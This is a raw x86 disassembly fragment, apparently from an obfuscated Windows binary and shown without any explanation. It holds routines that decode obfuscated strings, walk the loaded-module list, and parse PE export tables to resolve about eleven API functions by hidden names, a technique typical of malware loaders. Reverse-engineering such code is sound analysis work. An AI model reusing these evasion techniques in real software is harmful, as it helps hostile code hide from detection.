  427ece:	mov    eax,DWORD PTR [ebp-0xc]
  427ed1:	xor    eax,ecx
  427ed3:	add    eax,edx
  427ed5:	mov    DWORD PTR [ebp-0x28],eax
  427ed8:	mov    edi,DWORD PTR [ebp-0x20]
  427edb:	mov    ebx,DWORD PTR [ebp-0x8]
  427ede:	mov    esi,0x8ae
  427ee3:	xor    edi,esi
  427ee5:	mov    eax,0x72f5
  427eea:	xor    ebx,esi
  427eec:	add    edi,eax
  427eee:	add    ebx,eax
  427ef0:	sub    ebx,edi
  427ef2:	mov    WORD PTR [ebp-0x8],bx
  427ef6:	jmp    0x427fbb
  427efb:	mov    edi,DWORD PTR [ebp-0xc]
  427efe:	mov    bx,WORD PTR [ebp-0x4]
  427f02:	xor    edi,esi
  427f04:	add    edi,eax
  427f06:	cmp    bx,di
  427f09:	je     0x427ffd
  427f0f:	mov    edi,DWORD PTR [ebp-0xc]
  427f12:	mov    ebx,DWORD PTR [ebp+0xc]
  427f15:	xor    edi,ecx
  427f17:	add    edi,edx
  427f19:	cmp    ebx,edi
  427f1b:	mov    di,WORD PTR [ebp-0x4]
  427f1f:	mov    bx,WORD PTR [ebp+0x8]
  427f23:	je     0x427f8e
  427f25:	cmp    bx,di
  427f28:	je     0x427f97
  427f2a:	mov    edi,DWORD PTR [ebp-0x20]
  427f2d:	mov    bx,WORD PTR [ebp+0x8]
  427f31:	xor    edi,esi
  427f33:	add    edi,eax
  427f35:	cmp    bx,di
  427f38:	jb     0x427f58
  427f3a:	mov    edi,DWORD PTR [ebp-0x2c]
  427f3d:	mov    bx,WORD PTR [ebp+0x8]
  427f41:	xor    edi,esi
  427f43:	add    edi,eax
  427f45:	cmp    bx,di
  427f48:	ja     0x427f58
  427f4a:	movzx  edi,WORD PTR [ebp+0x8]
  427f4e:	movzx  ebx,WORD PTR [ebp-0x8]
  427f52:	add    edi,ebx
  427f54:	mov    WORD PTR [ebp+0x8],di
  427f58:	mov    edi,DWORD PTR [ebp-0x20]
  427f5b:	mov    bx,WORD PTR [ebp-0x4]
  427f5f:	xor    edi,esi
  427f61:	add    edi,eax
  427f63:	cmp    bx,di
  427f66:	jb     0x427f86
  427f68:	mov    edi,DWORD PTR [ebp-0x2c]
  427f6b:	mov    bx,WORD PTR [ebp-0x4]
  427f6f:	xor    edi,esi
  427f71:	add    edi,eax
  427f73:	cmp    bx,di
  427f76:	ja     0x427f86
  427f78:	movzx  edi,WORD PTR [ebp-0x4]
  427f7c:	movzx  ebx,WORD PTR [ebp-0x8]
  427f80:	add    edi,ebx
  427f82:	mov    WORD PTR [ebp-0x4],di
  427f86:	mov    di,WORD PTR [ebp-0x4]
  427f8a:	mov    bx,WORD PTR [ebp+0x8]
  427f8e:	cmp    bx,di
  427f91:	jne    0x42808b
  427f97:	mov    edi,DWORD PTR [ebp-0x1c]
  427f9a:	mov    ebx,DWORD PTR [ebp-0x10]
  427f9d:	xor    edi,ecx
  427f9f:	lea    edi,[edi+ebx*1+0x3272f5]
  427fa6:	mov    DWORD PTR [ebp-0x10],edi
  427fa9:	mov    edi,DWORD PTR [ebp-0x1c]
  427fac:	mov    ebx,DWORD PTR [ebp-0x14]
  427faf:	xor    edi,ecx
  427fb1:	lea    edi,[edi+ebx*1+0x3272f5]
  427fb8:	mov    DWORD PTR [ebp-0x14],edi
  427fbb:	mov    edi,DWORD PTR [ebp-0x24]
  427fbe:	mov    ebx,DWORD PTR [ebp-0x10]
  427fc1:	mov    di,WORD PTR [ebx+edi*2]
  427fc5:	mov    WORD PTR [ebp+0x8],di
  427fc9:	mov    edi,DWORD PTR [ebp-0x28]
  427fcc:	mov    ebx,DWORD PTR [ebp-0x14]
  427fcf:	mov    di,WORD PTR [ebx+edi*2]
  427fd3:	mov    WORD PTR [ebp-0x4],di
  427fd7:	mov    edi,DWORD PTR [ebp-0xc]
  427fda:	mov    bx,WORD PTR [ebp+0x8]
  427fde:	xor    edi,esi
  427fe0:	add    edi,eax
  427fe2:	cmp    bx,di
  427fe5:	jne    0x427efb
  427feb:	mov    eax,DWORD PTR [ebp-0x18]
  427fee:	mov    esi,DWORD PTR [ebp-0xc]
  427ff1:	xor    eax,ecx
  427ff3:	add    eax,edx
  427ff5:	imul   eax,esi
  427ff8:	mov    DWORD PTR [ebp-0xc],eax
  427ffb:	jmp    0x42800f
  427ffd:	mov    eax,DWORD PTR [ebp-0xc]
  428000:	mov    esi,DWORD PTR [ebp-0x18]
  428003:	xor    eax,ecx
  428005:	lea    eax,[eax+esi*1+0x3272f5]
  42800c:	mov    DWORD PTR [ebp-0x18],eax
  42800f:	mov    eax,DWORD PTR [ebp-0x24]
  428012:	sub    eax,edx
  428014:	xor    eax,ecx
  428016:	mov    DWORD PTR [ebp-0x30],eax
  428019:	mov    eax,DWORD PTR [ebp-0x28]
  42801c:	sub    eax,edx
  42801e:	xor    eax,ecx
  428020:	mov    DWORD PTR [ebp-0x34],eax
  428023:	mov    eax,DWORD PTR [ebp-0x34]
  428026:	mov    esi,DWORD PTR [ebp-0x1c]
  428029:	xor    esi,ecx
  42802b:	add    esi,edx
  42802d:	xor    eax,ecx
  42802f:	add    eax,0x3272f5
  428034:	imul   esi,eax
  428037:	mov    eax,DWORD PTR [ebp-0x14]
  42803a:	movzx  eax,WORD PTR [esi+eax*1]
  42803e:	mov    esi,DWORD PTR [ebp-0x30]
  428041:	mov    edi,DWORD PTR [ebp-0x1c]
  428044:	xor    esi,ecx
  428046:	add    esi,edx
  428048:	xor    edi,ecx
  42804a:	add    edi,edx
  42804c:	imul   edi,esi
  42804f:	mov    esi,DWORD PTR [ebp-0x10]
  428052:	movzx  esi,WORD PTR [edi+esi*1]
  428056:	sub    eax,edx
  428058:	sub    esi,edx
  42805a:	xor    eax,ecx
  42805c:	xor    esi,ecx
  42805e:	cmp    esi,eax
  428060:	jne    0x42808b
  428062:	mov    eax,DWORD PTR [ebp-0x30]
  428065:	mov    esi,DWORD PTR [ebp-0x1c]
  428068:	xor    eax,ecx
  42806a:	add    eax,0x3272f5
  42806f:	xor    esi,ecx
  428071:	add    esi,edx
  428073:	imul   esi,eax
  428076:	mov    eax,DWORD PTR [ebp-0x10]
  428079:	movzx  eax,WORD PTR [esi+eax*1]
  42807d:	mov    esi,DWORD PTR [ebp-0xc]
  428080:	sub    eax,edx
  428082:	xor    eax,ecx
  428084:	cmp    eax,esi
  428086:	mov    eax,DWORD PTR [ebp-0xc]
  428089:	je     0x42808e
  42808b:	mov    eax,DWORD PTR [ebp-0x18]
  42808e:	pop    edi
  42808f:	xor    eax,ecx
  428091:	pop    esi
  428092:	add    eax,edx
  428094:	pop    ebx
  428095:	leave  
  428096:	ret    0x8
  428099:	push   ebp
  42809a:	mov    ebp,esp
  42809c:	push   ecx
  42809d:	mov    cx,WORD PTR [eax]
  4280a0:	push   esi
  4280a1:	mov    esi,0x3b5c
  4280a6:	sub    cx,si
  4280a9:	mov    esi,0x8a9a
  4280ae:	xor    cx,si
  4280b1:	mov    esi,0x4e3e
  4280b6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4280bd:	mov    edx,0xf89c85a5
  4280c2:	cmp    cx,si
  4280c5:	je     0x428124
  4280c7:	push   ebx
  4280c8:	push   edi
  4280c9:	movzx  ecx,cx
  4280cc:	mov    edi,0xffcd8d0b
  4280d1:	mov    esi,0x75108ae
  4280d6:	mov    ebx,0x4f9a
  4280db:	cmp    cx,bx
  4280de:	jne    0x4280e3
  4280e0:	mov    DWORD PTR [ebp-0x4],edx
  4280e3:	lea    edx,[edi+0x1]
  4280e6:	xor    edx,esi
  4280e8:	mov    edi,edx
  4280ea:	xor    edi,esi
  4280ec:	mov    cx,WORD PTR [eax+edi*2+0x64e5ea]
  4280f4:	mov    ebx,0x3b5c
  4280f9:	sub    cx,bx
  4280fc:	mov    ebx,0x8a9a
  428101:	xor    cx,bx
  428104:	mov    ebx,0x4e3e
  428109:	cmp    cx,bx
  42810c:	jne    0x4280d6
  42810e:	mov    ecx,DWORD PTR [ebp-0x4]
  428111:	pop    edi
  428112:	pop    ebx
  428113:	cmp    ecx,0xf89c85a4
  428119:	je     0x428124
  42811b:	xor    ecx,esi
  42811d:	lea    eax,[eax+ecx*2+0x64e5ec]
  428124:	pop    esi
  428125:	leave  
  428126:	ret    
  428127:	push   ebp
  428128:	mov    ebp,esp
  42812a:	push   ecx
  42812b:	push   esi
  42812c:	push   edi
  42812d:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  428134:	mov    esi,0xf89c85a5
  428139:	call   0x428099
  42813e:	mov    edi,eax
  428140:	mov    al,BYTE PTR [edi]
  428142:	sub    al,0x3
  428144:	xor    al,0x7e
  428146:	cmp    al,0x83
  428148:	je     0x4281ab
  42814a:	mov    eax,edi
  42814c:	mov    edx,0xffcd8d0b
  428151:	mov    ecx,0x75108ae
  428156:	push   ebx
  428157:	mov    ax,WORD PTR [eax]
  42815a:	mov    ebx,0x3b5c
  42815f:	sub    ax,bx
  428162:	mov    ebx,0x8a9a
  428167:	xor    ax,bx
  42816a:	mov    ebx,0x4e48
  42816f:	cmp    ax,bx
  428172:	jne    0x428177
  428174:	mov    DWORD PTR [ebp-0x4],esi
  428177:	lea    esi,[edx+0x1]
  42817a:	xor    esi,ecx
  42817c:	mov    edx,esi
  42817e:	xor    edx,ecx
  428180:	lea    eax,[edi+edx*2+0x64e5ea]
  428187:	mov    bl,BYTE PTR [eax]
  428189:	sub    bl,0x3
  42818c:	xor    bl,0x7e
  42818f:	cmp    bl,0x83
  428192:	jne    0x428157
  428194:	mov    eax,DWORD PTR [ebp-0x4]
  428197:	pop    ebx
  428198:	cmp    eax,0xf89c85a4
  42819d:	je     0x4281ab
  42819f:	xor    eax,ecx
  4281a1:	xor    ecx,ecx
  4281a3:	mov    WORD PTR [edi+eax*2+0x64e5ea],cx
  4281ab:	mov    eax,edi
  4281ad:	pop    edi
  4281ae:	pop    esi
  4281af:	leave  
  4281b0:	ret    
  4281b1:	push   ebp
  4281b2:	mov    ebp,esp
  4281b4:	push   ecx
  4281b5:	push   esi
  4281b6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4281bd:	mov    esi,0xf89c85a5
  4281c2:	call   0x428099
  4281c7:	mov    cx,WORD PTR [eax]
  4281ca:	mov    edx,0x3b5c
  4281cf:	sub    cx,dx
  4281d2:	mov    edx,0x8a9a
  4281d7:	xor    cx,dx
  4281da:	mov    edx,0x4e3e
  4281df:	cmp    cx,dx
  4281e2:	je     0x42823b
  4281e4:	push   ebx
  4281e5:	push   edi
  4281e6:	movzx  ecx,cx
  4281e9:	mov    edx,0xffcd8d0b
  4281ee:	mov    edi,0x75108ae
  4281f3:	mov    ebx,0x4e48
  4281f8:	cmp    cx,bx
  4281fb:	jne    0x428200
  4281fd:	mov    DWORD PTR [ebp-0x4],esi
  428200:	lea    esi,[edx+0x1]
  428203:	xor    esi,edi
  428205:	mov    edx,esi
  428207:	xor    edx,edi
  428209:	mov    cx,WORD PTR [eax+edx*2+0x64e5ea]
  428211:	mov    ebx,0x3b5c
  428216:	sub    cx,bx
  428219:	mov    ebx,0x8a9a
  42821e:	xor    cx,bx
  428221:	mov    ebx,0x4e3e
  428226:	cmp    cx,bx
  428229:	jne    0x4281f3
  42822b:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  428232:	pop    edi
  428233:	pop    ebx
  428234:	je     0x42823b
  428236:	xor    eax,eax
  428238:	inc    eax
  428239:	jmp    0x42823d
  42823b:	xor    eax,eax
  42823d:	pop    esi
  42823e:	leave  
  42823f:	ret    
  428240:	push   ebp
  428241:	mov    ebp,esp
  428243:	push   ecx
  428244:	mov    eax,DWORD PTR [ebp+0x8]
  428247:	movzx  ecx,WORD PTR [eax]
  42824a:	push   esi
  42824b:	lea    eax,[ecx-0x3b5c]
  428251:	mov    esi,0x8a9a
  428256:	push   edi
  428257:	xor    eax,esi
  428259:	mov    edi,0x4e3e
  42825e:	mov    DWORD PTR [ebp-0x4],edx
  428261:	cmp    ax,di
  428264:	je     0x428291
  428266:	mov    eax,DWORD PTR [ebp+0x8]
  428269:	sub    eax,edx
  42826b:	mov    DWORD PTR [ebp+0x8],eax
  42826e:	jmp    0x428273
  428270:	mov    eax,DWORD PTR [ebp+0x8]
  428273:	mov    WORD PTR [edx],cx
  428276:	add    edx,0x2
  428279:	movzx  edi,WORD PTR [eax+edx*1]
  42827d:	mov    ecx,edi
  42827f:	add    edi,0xffffc4a4
  428285:	xor    edi,esi
  428287:	mov    eax,0x4e3e
  42828c:	cmp    di,ax
  42828f:	jne    0x428270
  428291:	xor    eax,eax
  428293:	pop    edi
  428294:	mov    WORD PTR [edx],ax
  428297:	mov    eax,DWORD PTR [ebp-0x4]
  42829a:	pop    esi
  42829b:	leave  
  42829c:	ret    0x4
  42829f:	push   ebp
  4282a0:	mov    ebp,esp
  4282a2:	sub    esp,0x18
  4282a5:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4282ac:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  4282b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282b6:	push   esi
  4282b7:	mov    eax,0x75108ae
  4282bc:	xor    ecx,eax
  4282be:	mov    esi,0x3272f5
  4282c3:	add    ecx,esi
  4282c5:	mov    DWORD PTR [ebp-0x4],ecx
  4282c8:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4282cf:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  4282d6:	push   edi
  4282d7:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  4282de:	jmp    0x42837f
  4282e3:	mov    ecx,DWORD PTR [ebp-0x4]
  4282e6:	mov    edx,DWORD PTR [ebp+0x10]
  4282e9:	sub    edx,ecx
  4282eb:	mov    ecx,DWORD PTR [ebp-0xc]
  4282ee:	xor    ecx,eax
  4282f0:	add    ecx,esi
  4282f2:	cmp    edx,ecx
  4282f4:	jbe    0x428311
  4282f6:	mov    edx,DWORD PTR [ebp-0x4]
  4282f9:	add    edx,DWORD PTR [ebp+0x8]
  4282fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4282ff:	add    ecx,DWORD PTR [ebp+0xc]
  428302:	mov    edi,DWORD PTR [ecx]
  428304:	mov    DWORD PTR [edx],edi
  428306:	mov    ecx,DWORD PTR [ecx+0x4]
  428309:	mov    DWORD PTR [edx+0x4],ecx
  42830c:	mov    ecx,DWORD PTR [ebp-0xc]
  42830f:	jmp    0x42835e
  428311:	mov    ecx,DWORD PTR [ebp-0x4]
  428314:	mov    edx,DWORD PTR [ebp+0x10]
  428317:	sub    edx,ecx
  428319:	mov    ecx,DWORD PTR [ebp-0x10]
  42831c:	xor    ecx,eax
  42831e:	add    ecx,esi
  428320:	cmp    edx,ecx
  428322:	mov    ecx,DWORD PTR [ebp-0x4]
  428325:	jbe    0x428339
  428327:	add    ecx,DWORD PTR [ebp+0x8]
  42832a:	mov    edx,DWORD PTR [ebp-0x4]
  42832d:	add    edx,DWORD PTR [ebp+0xc]
  428330:	mov    edx,DWORD PTR [edx]
  428332:	mov    DWORD PTR [ecx],edx
  428334:	mov    ecx,DWORD PTR [ebp-0x10]
  428337:	jmp    0x42835e
  428339:	mov    edx,DWORD PTR [ebp+0x10]
  42833c:	sub    edx,ecx
  42833e:	mov    ecx,DWORD PTR [ebp-0x14]
  428341:	xor    ecx,eax
  428343:	add    ecx,esi
  428345:	cmp    edx,ecx
  428347:	mov    ecx,DWORD PTR [ebp-0x4]
  42834a:	jbe    0x42836f
  42834c:	add    ecx,DWORD PTR [ebp+0x8]
  42834f:	mov    edx,DWORD PTR [ebp-0x4]
  428352:	add    edx,DWORD PTR [ebp+0xc]
  428355:	mov    dx,WORD PTR [edx]
  428358:	mov    WORD PTR [ecx],dx
  42835b:	mov    ecx,DWORD PTR [ebp-0x14]
  42835e:	mov    edx,DWORD PTR [ebp-0x4]
  428361:	xor    ecx,eax
  428363:	lea    ecx,[ecx+edx*1+0x3272f5]
  42836a:	mov    DWORD PTR [ebp-0x4],ecx
  42836d:	jmp    0x42837f
  42836f:	add    ecx,DWORD PTR [ebp+0x8]
  428372:	mov    edx,DWORD PTR [ebp-0x4]
  428375:	add    edx,DWORD PTR [ebp+0xc]
  428378:	mov    dl,BYTE PTR [edx]
  42837a:	mov    BYTE PTR [ecx],dl
  42837c:	inc    DWORD PTR [ebp-0x4]
  42837f:	mov    ecx,DWORD PTR [ebp-0x18]
  428382:	mov    edx,DWORD PTR [ebp+0x10]
  428385:	xor    ecx,eax
  428387:	add    ecx,esi
  428389:	imul   ecx,edx
  42838c:	mov    edx,DWORD PTR [ebp-0x8]
  42838f:	mov    edi,DWORD PTR [ebp-0x4]
  428392:	xor    edx,eax
  428394:	lea    edx,[edx+edi*1+0x3272f5]
  42839b:	cmp    edx,ecx
  42839d:	jb     0x4282e3
  4283a3:	pop    edi
  4283a4:	pop    esi
  4283a5:	leave  
  4283a6:	ret    0xc
  4283a9:	push   ebp
  4283aa:	mov    ebp,esp
  4283ac:	sub    esp,0xc
  4283af:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4283b6:	push   esi
  4283b7:	mov    esi,eax
  4283b9:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  4283c0:	mov    edx,DWORD PTR [ebp-0x4]
  4283c3:	mov    eax,0x75108ae
  4283c8:	xor    edx,eax
  4283ca:	mov    ecx,0x3272f5
  4283cf:	add    edx,ecx
  4283d1:	cmp    esi,edx
  4283d3:	je     0x428415
  4283d5:	push   ebx
  4283d6:	push   edi
  4283d7:	mov    edx,DWORD PTR [ebp-0x8]
  4283da:	mov    ebx,DWORD PTR [ebp+0x8]
  4283dd:	xor    edx,eax
  4283df:	mov    edi,0xffcd8d0b
  4283e4:	sub    edi,edx
  4283e6:	add    esi,edi
  4283e8:	lea    edx,[esi-0x3272f5]
  4283ee:	xor    edx,eax
  4283f0:	mov    DWORD PTR [ebp-0xc],edx
  4283f3:	mov    edx,DWORD PTR [ebp-0x4]
  4283f6:	mov    edi,DWORD PTR [ebp-0xc]
  4283f9:	xor    dl,0xae
  4283fc:	sub    dl,0xb
  4283ff:	xor    edi,eax
  428401:	mov    BYTE PTR [edi+ebx*1+0x3272f5],dl
  428408:	mov    edx,DWORD PTR [ebp-0x4]
  42840b:	xor    edx,eax
  42840d:	add    edx,ecx
  42840f:	cmp    esi,edx
  428411:	jne    0x4283d7
  428413:	pop    edi
  428414:	pop    ebx
  428415:	pop    esi
  428416:	leave  
  428417:	ret    0x4
  42841a:	push   ebp
  42841b:	mov    ebp,esp
  42841d:	sub    esp,0x21c
  428423:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42842a:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  428431:	mov    eax,DWORD PTR [ebp+0x10]
  428434:	mov    eax,DWORD PTR [ebp-0x4]
  428437:	mov    ecx,DWORD PTR [ebp+0x8]
  42843a:	push   esi
  42843b:	push   edi
  42843c:	mov    edi,0x75108ae
  428441:	xor    eax,edi
  428443:	mov    esi,0x3272f5
  428448:	add    eax,esi
  42844a:	cmp    eax,ecx
  42844c:	mov    eax,DWORD PTR [ebp-0x4]
  42844f:	jne    0x42845a
  428451:	xor    eax,edi
  428453:	add    eax,esi
  428455:	jmp    0x428506
  42845a:	mov    ecx,DWORD PTR [ebp+0xc]
  42845d:	xor    eax,edi
  42845f:	add    eax,esi
  428461:	cmp    eax,ecx
  428463:	jne    0x42846a
  428465:	mov    eax,DWORD PTR [ebp-0x4]
  428468:	jmp    0x428451
  42846a:	lea    eax,[ebp-0x21c]
  428470:	mov    DWORD PTR [ebp-0x8],eax
  428473:	mov    eax,DWORD PTR [ebp+0xc]
  428476:	mov    DWORD PTR [ebp-0x10],eax
  428479:	mov    eax,DWORD PTR [ebp-0x4]
  42847c:	xor    eax,edi
  42847e:	add    eax,esi
  428480:	mov    DWORD PTR [ebp+0x10],eax
  428483:	mov    eax,DWORD PTR [ebp+0xc]
  428486:	push   ebx
  428487:	call   0x4281b1
  42848c:	mov    ebx,eax
  42848e:	mov    eax,DWORD PTR [ebp+0x8]
  428491:	mov    eax,DWORD PTR [eax+0x14]
  428494:	jmp    0x4284ee
  428496:	mov    eax,DWORD PTR [ebp+0xc]
  428499:	sub    eax,0x8
  42849c:	mov    DWORD PTR [ebp-0xc],eax
  42849f:	mov    eax,DWORD PTR [ebp-0xc]
  4284a2:	mov    eax,DWORD PTR [eax+0x28]
  4284a5:	call   0x428099
  4284aa:	mov    DWORD PTR [ebp+0x10],eax
  4284ad:	push   DWORD PTR [ebp+0x10]
  4284b0:	mov    edx,DWORD PTR [ebp-0x8]
  4284b3:	call   0x428240
  4284b8:	mov    eax,DWORD PTR [ebp-0x4]
  4284bb:	xor    eax,edi
  4284bd:	add    eax,esi
  4284bf:	cmp    eax,ebx
  4284c1:	jne    0x4284cb
  4284c3:	mov    eax,DWORD PTR [ebp-0x8]
  4284c6:	call   0x428127
  4284cb:	mov    eax,DWORD PTR [ebp-0x14]
  4284ce:	xor    eax,edi
  4284d0:	add    eax,esi
  4284d2:	push   eax
  4284d3:	push   DWORD PTR [ebp-0x10]
  4284d6:	mov    eax,DWORD PTR [ebp-0x8]
  4284d9:	call   0x427e53
  4284de:	mov    ecx,DWORD PTR [ebp-0x4]
  4284e1:	xor    ecx,edi
  4284e3:	add    ecx,esi
  4284e5:	cmp    eax,ecx
  4284e7:	je     0x42850c
  4284e9:	mov    eax,DWORD PTR [ebp+0xc]
  4284ec:	mov    eax,DWORD PTR [eax]
  4284ee:	mov    DWORD PTR [ebp+0xc],eax
  4284f1:	mov    eax,DWORD PTR [ebp+0x8]
  4284f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4284f7:	add    eax,0x14
  4284fa:	cmp    ecx,eax
  4284fc:	jne    0x428496
  4284fe:	mov    eax,DWORD PTR [ebp-0x4]
  428501:	xor    eax,edi
  428503:	add    eax,esi
  428505:	pop    ebx
  428506:	pop    edi
  428507:	pop    esi
  428508:	leave  
  428509:	ret    0xc
  42850c:	mov    eax,DWORD PTR [ebp-0xc]
  42850f:	mov    eax,DWORD PTR [eax+0x18]
  428512:	jmp    0x428505
  428514:	push   ebp
  428515:	mov    ebp,esp
  428517:	mov    eax,DWORD PTR [ebp+0xc]
  42851a:	sub    esp,0x10
  42851d:	cmp    DWORD PTR [ebp+0x8],0x0
  428521:	push   ebx
  428522:	push   esi
  428523:	push   edi
  428524:	je     0x4285d9
  42852a:	test   eax,eax
  42852c:	je     0x4285d9
  428532:	movzx  eax,WORD PTR [eax+0x20]
  428536:	mov    ecx,eax
  428538:	mov    DWORD PTR [ebp-0x10],eax
  42853b:	xor    edx,edx
  42853d:	and    DWORD PTR [ebp-0x8],edx
  428540:	mov    eax,0x8a9a
  428545:	xor    ecx,eax
  428547:	add    ecx,0x3b5c
  42854d:	mov    DWORD PTR [ebp-0xc],ecx
  428550:	and    DWORD PTR [ebp-0x4],0x0
  428554:	xor    ecx,ecx
  428556:	push   0xffffff81
  428558:	pop    edi
  428559:	cmp    cx,WORD PTR [ebp-0xc]
  42855d:	jae    0x4285c3
  42855f:	lea    esi,[edx-0x3b5c]
  428565:	xor    esi,eax
  428567:	movzx  ecx,WORD PTR [ebp-0x4]
  42856b:	mov    ebx,DWORD PTR [ebp+0xc]
  42856e:	lea    ecx,[ebx+ecx*4]
  428571:	cmp    WORD PTR [ecx+0x2],si
  428575:	jne    0x4285ae
  428577:	movzx  ecx,WORD PTR [ecx]
  42857a:	mov    edi,0x4e3e
  42857f:	cmp    cx,di
  428582:	jne    0x428590
  428584:	mov    ebx,DWORD PTR [ebp+0x8]
  428587:	movzx  edi,dx
  42858a:	cmp    BYTE PTR [edi+ebx*1],0x0
  42858e:	je     0x4285bd
  428590:	mov    ebx,DWORD PTR [ebp+0x8]
  428593:	movzx  edi,dx
  428596:	movsx  di,BYTE PTR [edi+ebx*1]
  42859b:	mov    ebx,0x3b5c
  4285a0:	sub    di,bx
  4285a3:	xor    di,ax
  4285a6:	cmp    cx,di
  4285a9:	je     0x4285bd
  4285ab:	push   0xffffff83
  4285ad:	pop    edi
  4285ae:	inc    DWORD PTR [ebp-0x4]
  4285b1:	mov    cx,WORD PTR [ebp-0xc]
  4285b5:	cmp    WORD PTR [ebp-0x4],cx
  4285b9:	jb     0x428567
  4285bb:	jmp    0x4285c3
  4285bd:	inc    DWORD PTR [ebp-0x8]
  4285c0:	push   0xffffff80
  4285c2:	pop    edi
  4285c3:	mov    esi,DWORD PTR [ebp+0x8]
  4285c6:	movzx  ecx,dx
  4285c9:	cmp    BYTE PTR [ecx+esi*1],0x0
  4285cd:	je     0x4285e2
  4285cf:	inc    edx
  4285d0:	cmp    edi,0xffffff83
  4285d3:	jne    0x428550
  4285d9:	xor    eax,eax
  4285db:	pop    edi
  4285dc:	pop    esi
  4285dd:	pop    ebx
  4285de:	leave  
  4285df:	ret    0x8
  4285e2:	mov    ecx,DWORD PTR [ebp-0x8]
  4285e5:	add    ecx,0xffffc4a4
  4285eb:	xor    cx,ax
  4285ee:	xor    eax,eax
  4285f0:	cmp    cx,WORD PTR [ebp-0x10]
  4285f4:	sete   al
  4285f7:	jmp    0x4285db
  4285f9:	push   ebp
  4285fa:	mov    ebp,esp
  4285fc:	sub    esp,0x50
  4285ff:	push   edi
  428600:	mov    edi,eax
  428602:	mov    eax,DWORD PTR [edi+0x1a8]
  428608:	cmp    DWORD PTR [eax],0x0
  42860b:	jne    0x428614
  42860d:	xor    eax,eax
  42860f:	jmp    0x428745
  428614:	push   DWORD PTR [ebp+0x8]
  428617:	push   0x2c
  428619:	pop    eax
  42861a:	call   0x4283a9
  42861f:	mov    edx,DWORD PTR [edi+0x1ac]
  428625:	lea    eax,[edi+0x22]
  428628:	mov    DWORD PTR [ebp-0x4c],eax
  42862b:	lea    eax,[edi+0x44]
  42862e:	mov    DWORD PTR [ebp-0x48],eax
  428631:	lea    eax,[edi+0x66]
  428634:	mov    DWORD PTR [ebp-0x44],eax
  428637:	lea    eax,[edi+0x88]
  42863d:	mov    DWORD PTR [ebp-0x40],eax
  428640:	lea    eax,[edi+0xaa]
  428646:	mov    DWORD PTR [ebp-0x3c],eax
  428649:	lea    eax,[edi+0xcc]
  42864f:	mov    DWORD PTR [ebp-0x38],eax
  428652:	lea    eax,[edi+0xee]
  428658:	mov    DWORD PTR [ebp-0x34],eax
  42865b:	lea    eax,[edi+0x110]
  428661:	mov    DWORD PTR [ebp-0x30],eax
  428664:	lea    eax,[edi+0x132]
  42866a:	mov    DWORD PTR [ebp-0x2c],eax
  42866d:	lea    eax,[edi+0x154]
  428673:	push   edi
  428674:	mov    DWORD PTR [ebp-0x50],edi
  428677:	mov    DWORD PTR [ebp-0x28],eax
  42867a:	call   0x428779
  42867f:	push   eax
  428680:	mov    eax,DWORD PTR [edi+0x1a8]
  428686:	push   DWORD PTR [eax]
  428688:	call   0x42841a
  42868d:	mov    DWORD PTR [ebp-0x10],eax
  428690:	test   eax,eax
  428692:	je     0x428745
  428698:	mov    ecx,DWORD PTR [eax+0x3c]
  42869b:	push   ebx
  42869c:	push   esi
  42869d:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4286a1:	add    esi,eax
  4286a3:	mov    edi,DWORD PTR [esi+0x24]
  4286a6:	mov    ecx,DWORD PTR [esi+0x1c]
  4286a9:	mov    edx,DWORD PTR [esi+0x20]
  4286ac:	mov    ebx,DWORD PTR [esi+0x18]
  4286af:	add    edi,eax
  4286b1:	mov    DWORD PTR [ebp-0x20],edi
  4286b4:	mov    edi,DWORD PTR [esi+0x14]
  4286b7:	add    ecx,eax
  4286b9:	add    edx,eax
  4286bb:	mov    DWORD PTR [ebp-0xc],ecx
  4286be:	mov    DWORD PTR [ebp-0x1c],edx
  4286c1:	mov    DWORD PTR [ebp-0x8],edi
  4286c4:	cmp    edi,ebx
  4286c6:	ja     0x4286cb
  4286c8:	mov    DWORD PTR [ebp-0x8],ebx
  4286cb:	xor    ebx,ebx
  4286cd:	mov    DWORD PTR [ebp-0x18],ebx
  4286d0:	cmp    DWORD PTR [ebp-0x8],ebx
  4286d3:	jbe    0x428743
  4286d5:	jmp    0x4286da
  4286d7:	mov    edx,DWORD PTR [ebp-0x1c]
  4286da:	mov    edi,DWORD PTR [ebp-0x20]
  4286dd:	movzx  edi,WORD PTR [edi+ebx*2]
  4286e1:	cmp    ebx,DWORD PTR [esi+0x18]
  4286e4:	jae    0x428743
  4286e6:	cmp    edi,DWORD PTR [esi+0x14]
  4286e9:	jae    0x428743
  4286eb:	mov    ebx,DWORD PTR [edx+ebx*4]
  4286ee:	mov    edx,DWORD PTR [ebp+0x8]
  4286f1:	mov    edi,DWORD PTR [ecx+edi*4]
  4286f4:	mov    DWORD PTR [ebp-0x4],edx
  4286f7:	lea    edx,[ebp-0x50]
  4286fa:	add    ebx,eax
  4286fc:	add    edi,eax
  4286fe:	sub    edx,DWORD PTR [ebp+0x8]
  428701:	mov    DWORD PTR [ebp-0x14],0xb
  428708:	mov    DWORD PTR [ebp-0x24],edx
  42870b:	mov    edx,DWORD PTR [ebp-0x4]
  42870e:	cmp    DWORD PTR [edx],0x0
  428711:	jne    0x42872e
  428713:	mov    eax,DWORD PTR [ebp-0x24]
  428716:	push   DWORD PTR [eax+edx*1]
  428719:	push   ebx
  42871a:	call   0x428514
  42871f:	mov    ecx,DWORD PTR [ebp-0xc]
  428722:	test   eax,eax
  428724:	je     0x42872b
  428726:	mov    eax,DWORD PTR [ebp-0x4]
  428729:	mov    DWORD PTR [eax],edi
  42872b:	mov    eax,DWORD PTR [ebp-0x10]
  42872e:	add    DWORD PTR [ebp-0x4],0x4
  428732:	dec    DWORD PTR [ebp-0x14]
  428735:	jne    0x42870b
